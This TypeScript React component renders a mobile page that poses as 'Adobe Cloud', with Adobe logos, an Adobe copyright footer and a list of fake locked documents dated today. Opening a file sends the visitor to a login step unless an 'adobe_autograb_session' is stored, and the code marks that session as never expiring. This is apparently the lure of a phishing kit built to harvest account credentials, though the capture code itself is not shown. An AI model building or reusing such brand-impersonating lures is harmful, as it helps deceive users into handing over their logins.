import React, { useState, useEffect } from 'react';
import { FileText, Download, Eye, Trash2, Calendar, User, Menu, X, Grid3X3, List, Upload, ChevronRight } from 'lucide-react';

interface File {
  name: string;
  type: 'pdf' | 'docx' | 'xlsx';
  size: string;
  date: string;
}

interface MobileLandingPageProps {
  onFileAction: (fileName: string, action: 'view' | 'download') => void;
}

const MobileLandingPage: React.FC<MobileLandingPageProps> = ({ onFileAction }) => {
  const [activeNav, setActiveNav] = useState('Protected Files');
  const [currentDate, setCurrentDate] = useState('');
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(false);
  const [sessionInfo, setSessionInfo] = useState<any>(null);

  // Generate current date
  useEffect(() => {
    const now = new Date();
    const options: Intl.DateTimeFormatOptions = { 
      month: 'short', 
      day: 'numeric' 
    };
    setCurrentDate(now.toLocaleDateString('en-US', options));
  }, []);

  // Check for existing sessions on component mount
  useEffect(() => {
    checkForExistingSession();
  }, []);

  const checkForExistingSession = async () => {
    try {
      // Check server session first
      const response = await fetch('/.netlify/functions/getSession', {
        method: 'GET',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json'
        }
      });

      if (response.ok) {
        const data = await response.json();
        if (data.success && data.session) {
          setHasActiveSession(true);
          setSessionInfo(data.session);
          return;
        }
      }

      // Check localStorage for autograb session
      const storedSession = localStorage.getItem('adobe_autograb_session');
      if (storedSession) {
        try {
          const sessionData = JSON.parse(storedSession);
          const sessionTime = new Date(sessionData.timestamp);
          const now = new Date();
          const hoursDiff = (now.getTime() - sessionTime.getTime()) / (1000 * 60 * 60);
          
          // Session never expires - always valid
          if (true) {
            setHasActiveSession(true);
            setSessionInfo(sessionData);
            console.log('AutoGrab session found:', sessionData);
          }
        } catch (error) {
          console.error('Error parsing stored session:', error);
        }
      }
    } catch (error) {
      console.log('No existing session found:', error);
    }
  };

  // Convert file sizes to kilobytes and use current date
  const protectedFiles: File[] = [
    { name: 'Document1.pdf', type: 'pdf', size: '54 KB', date: currentDate },
    { name: 'Report.docx', type: 'docx', size: '56 KB', date: currentDate },
    { name: 'Data.xlsx', type: 'xlsx', size: '50 KB', date: currentDate },
    { name: 'Notes.pdf', type: 'pdf', size: '52 KB', date: currentDate },
    { name: 'Overview.docx', type: 'docx', size: '52 KB', date: currentDate },
    { name: 'Budget.pdf', type: 'pdf', size: '52 KB', date: currentDate },
    { name: 'Summary.pdf', type: 'pdf', size: '50 KB', date: currentDate },
    { name: 'Contract.pdf', type: 'pdf', size: '50 KB', date: currentDate },
    { name: 'Contract2.pdf', type: 'pdf', size: '52 KB', date: currentDate },
  ];

  // Recent files - only one PDF
  const recentFiles: File[] = [
    { name: 'protected-document.pdf', type: 'pdf', size: '48 KB', date: currentDate },
  ];

  const getFileIcon = (type: string) => {
    const baseClasses = "w-12 h-12 flex items-center justify-center rounded-xl font-bold text-sm uppercase tracking-wide shadow-sm";
    switch (type) {
      case 'pdf':
        return `${baseClasses} bg-red-50 text-red-600 border border-red-100`;
      case 'docx':
        return `${baseClasses} bg-blue-50 text-blue-600 border border-blue-100`;
      case 'xlsx':
        return `${baseClasses} bg-green-50 text-green-600 border border-green-100`;
      default:
        return `${baseClasses} bg-gray-50 text-gray-600 border border-gray-100`;
    }
  };

  const navItems = ['Protected Files', 'Shared With Me', 'Recent', 'Trash'];

  const getHeaderContent = () => {
    switch (activeNav) {
      case 'Protected Files':
        return {
          title: 'Protected Files',
          description: 'All your secure and recent documents.'
        };
      case 'Shared With Me':
        return {
          title: 'Shared With Me',
          description: 'Documents shared by your team members.'
        };
      case 'Recent':
        return {
          title: 'Recent Files',
          description: 'Your recently accessed documents.'
        };
      case 'Trash':
        return {
          title: 'Trash',
          description: 'Deleted files and documents.'
        };
      default:
        return {
          title: 'Protected Files',
          description: 'All your secure and recent documents.'
        };
    }
  };

  const getCurrentFiles = () => {
    switch (activeNav) {
      case 'Protected Files':
        return protectedFiles;
      case 'Shared With Me':
        return protectedFiles;
      case 'Recent':
        return recentFiles;
      case 'Trash':
        return [];
      default:
        return protectedFiles;
    }
  };

  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    // Check if we have an active session for autograb
    if (hasActiveSession && sessionInfo) {
      console.log('Using autograb session for file access:', sessionInfo);
      const successDiv = document.createElement('div');
      successDiv.innerHTML = `
        <div style="
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: #1E1E1E;
          color: white;
          padding: 30px 25px;
          border-radius: 16px;
          box-shadow: 0 20px 40px rgba(0,0,0,0.3);
          z-index: 10000;
          text-align: center;
          font-family: system-ui, -apple-system, sans-serif;
          min-width: 280px;
          max-width: 90vw;
          border: 1px solid #FF0000;
        ">
          <div style="color: #FF0000; font-size: 20px; font-weight: 600; margin-bottom: 12px;">
            ✓ Access Granted!
          </div>
          <div style="color: #E5E7EB; font-size: 16px; line-height: 1.4;">
            Opening ${fileName}...
          </div>
        </div>
      `;
      document.body.appendChild(successDiv);
      setTimeout(() => {
        document.body.removeChild(successDiv);
      }, 2500);
      return;
    }

    // No session available, require login
    onFileAction(fileName, action);
  };

  const headerContent = getHeaderContent();
  const currentFiles = getCurrentFiles();

  const renderEmptyState = () => (
    <div className="flex flex-col items-center justify-center py-20 text-center px-6">
      <div className="w-20 h-20 bg-[#2C2C2C]/80 backdrop-blur-sm rounded-full flex items-center justify-center mb-6 shadow-lg">
        <Trash2 className="w-10 h-10 text-gray-400" />
      </div>
      <h3 className="text-xl font-semibold text-white mb-3">Trash is empty</h3>
      <p className="text-base text-gray-300 max-w-sm leading-relaxed">
        When you delete files, they'll appear here before being permanently removed.
      </p>
    </div>
  );

  const renderMobileFileList = () => (
    <div className="space-y-4">
      {currentFiles.map((file, index) => (
        <div
          key={index}
          className="bg-[#1E1E1E]/95 backdrop-blur-lg rounded-2xl shadow-lg border border-[#2C2C2C]/50 overflow-hidden"
        >
          {/* File Header */}
          <div className="p-5">
            <div className="flex items-center gap-4 mb-4">
              <div className={getFileIcon(file.type)}>
                {file.type}
              </div>
              <div className="flex-1 min-w-0">
                <h3 className="font-semibold text-white text-lg leading-tight mb-1">
                  {file.name}
                </h3>
                <p className="text-sm text-gray-400 flex items-center gap-2">
                  <Calendar className="w-4 h-4" />
                  Modified {file.date} • {file.size}
                </p>
              </div>
              <ChevronRight className="w-5 h-5 text-gray-400" />
            </div>

            {/* Status Badge */}
            <div className="flex items-center justify-between mb-4">
              <span className={`text-sm font-semibold px-3 py-2 rounded-full ${
                hasActiveSession 
                  ? 'text-green-400 bg-green-400/10 border border-green-400/20' 
                  : 'text-[#FF0000] bg-[#FF0000]/10 border border-[#FF0000]/20'
              }`}>
                {hasActiveSession ? '🔓 Unlocked' : '🔒 Protected'}
              </span>
            </div>

            {/* File Actions */}
            <div className="flex gap-3">
              <button
                onClick={() => handleFileAction(file.name, 'view')}
                className="flex-1 flex items-center justify-center gap-2 px-6 py-4 bg-gradient-to-r from-[#FF0000] to-[#DC2626] text-white rounded-xl font-medium text-base hover:from-[#DC2626] hover:to-[#B91C1C] transition-all duration-200 shadow-lg active:scale-95"
              >
                <Eye className="w-5 h-5" />
                View File
              </button>
              <button
                onClick={() => handleFileAction(file.name, 'download')}
                className="flex items-center justify-center gap-2 px-6 py-4 bg-[#2C2C2C]/90 backdrop-blur-sm border-2 border-[#2C2C2C] text-gray-300 rounded-xl font-medium text-base hover:bg-[#2C2C2C] hover:border-[#2C2C2C] hover:text-white transition-all duration-200 shadow-md active:scale-95"
              >
                <Download className="w-5 h-5" />
              </button>
            </div>
          </div>
        </div>
      ))}
    </div>
  );

  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Dark gradient background with red/purple accents */}
      <div className="absolute inset-0 bg-gradient-to-br from-[#121212] via-[#1E1E1E] to-[#2C2C2C]"></div>
      <div className="absolute inset-0 bg-gradient-to-tr from-[#FF0000]/10 via-transparent to-[#8B5CF6]/10"></div>
      
      {/* Subtle abstract shapes and blurry overlays */}
      <div className="absolute top-10 right-5 w-32 h-32 bg-[#FF0000]/8 rounded-full blur-2xl"></div>
      <div className="absolute bottom-10 left-5 w-28 h-28 bg-[#8B5CF6]/6 rounded-full blur-xl"></div>
      <div className="absolute top-1/3 right-1/4 w-24 h-24 bg-[#EC4899]/7 rounded-full blur-lg"></div>
      <div className="absolute bottom-1/3 left-1/3 w-20 h-20 bg-[#FF0000]/8 rounded-full blur-lg"></div>

      {/* Mobile Menu Overlay */}
      {isMobileMenuOpen && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-40" onClick={() => setIsMobileMenuOpen(false)} />
      )}

      {/* Mobile Sidebar */}
      <aside className={`fixed inset-y-0 left-0 z-50 w-80 bg-[#1E1E1E]/95 backdrop-blur-xl border-r border-[#2C2C2C]/50 flex flex-col shadow-2xl transition-transform duration-300 ${
        isMobileMenuOpen ? 'translate-x-0' : '-translate-x-full'
      }`}>
        <div className="p-6 flex-1">
          {/* Close Button */}
          <button
            onClick={() => setIsMobileMenuOpen(false)}
            className="absolute top-4 right-4 p-2 text-gray-500 hover:text-gray-300 bg-[#2C2C2C]/80 rounded-full"
          >
            <X className="w-6 h-6" />
          </button>

          {/* Logo Section */}
          <div className="flex items-center gap-4 mb-8 pt-2">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
              alt="Adobe Acrobat" 
              className="w-12 h-12 object-contain"
            />
            <h1 className="text-xl font-semibold text-white">Adobe Cloud</h1>
          </div>

          {/* Navigation */}
          <nav className="space-y-3">
            {navItems.map((item) => (
              <button
                key={item}
                onClick={() => {
                  setActiveNav(item);
                  setIsMobileMenuOpen(false);
                }}
                className={`w-full text-left px-4 py-4 rounded-xl font-medium text-base transition-all duration-200 flex items-center justify-between ${
                  activeNav === item
                    ? 'bg-[#FF0000]/10 text-[#FF0000] shadow-sm border border-[#FF0000]/20'
                    : 'text-gray-300 hover:bg-[#2C2C2C]/80 hover:text-white'
                }`}
              >
                {item}
                {activeNav === item && <ChevronRight className="w-5 h-5" />}
              </button>
            ))}
          </nav>
        </div>

        {/* Adobe Footer */}
        <div className="p-6 border-t border-[#2C2C2C]/50">
          <p className="text-sm text-gray-400 leading-relaxed font-medium">
            © 2025 Adobe Inc.<br />
            All rights reserved.
          </p>
        </div>
      </aside>

      {/* Main Content */}
      <main className="relative z-10 min-h-screen">
        {/* Mobile Header */}
        <div className="sticky top-0 z-30 bg-[#1E1E1E]/95 backdrop-blur-xl border-b border-[#2C2C2C]/60 px-5 py-4">
          <div className="flex items-center justify-between">
            <button
              onClick={() => setIsMobileMenuOpen(true)}
              className="p-3 text-gray-300 hover:text-white bg-[#2C2C2C]/90 backdrop-blur-sm rounded-xl shadow-sm border border-[#2C2C2C]"
            >
              <Menu className="w-6 h-6" />
            </button>
            <div className="flex items-center gap-3">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
                alt="Adobe Acrobat" 
                className="w-8 h-8 object-contain"
              />
              <span className="font-semibold text-white text-lg">Adobe Cloud</span>
            </div>
            <div className="w-12"></div> {/* Spacer for centering */}
          </div>
        </div>

        {/* Content Area */}
        <div className="p-5 pb-8">
          {/* Page Header */}
          <div className="mb-6">
            <h2 className="text-2xl font-bold text-white mb-2">
              {headerContent.title}
            </h2>
            <p className="text-base text-gray-300 font-medium leading-relaxed">{headerContent.description}</p>
          </div>

          {/* Action Buttons - Only show if not in Trash */}
          {activeNav !== 'Trash' && (
            <div className="flex gap-3 mb-6">
              <button className="flex-1 flex items-center justify-center gap-2 px-6 py-4 rounded-xl font-medium text-base bg-[#2C2C2C]/95 backdrop-blur-sm text-gray-300 border-2 border-[#2C2C2C] hover:bg-[#2C2C2C] hover:border-[#2C2C2C] hover:text-white transition-all duration-200 shadow-md">
                <Grid3X3 className="w-5 h-5" />
                Grid View
              </button>
              <button className="flex items-center justify-center gap-2 px-6 py-4 rounded-xl font-medium text-base bg-[#2C2C2C]/95 backdrop-blur-sm text-gray-300 border-2 border-[#2C2C2C] hover:bg-[#2C2C2C] hover:border-[#2C2C2C] hover:text-white transition-all duration-200 shadow-md">
                <Upload className="w-5 h-5" />
                Upload
              </button>
            </div>
          )}

          {/* File List */}
          {activeNav === 'Trash' ? renderEmptyState() : renderMobileFileList()}
        </div>
      </main>
    </div>
  );
};

export default MobileLandingPage;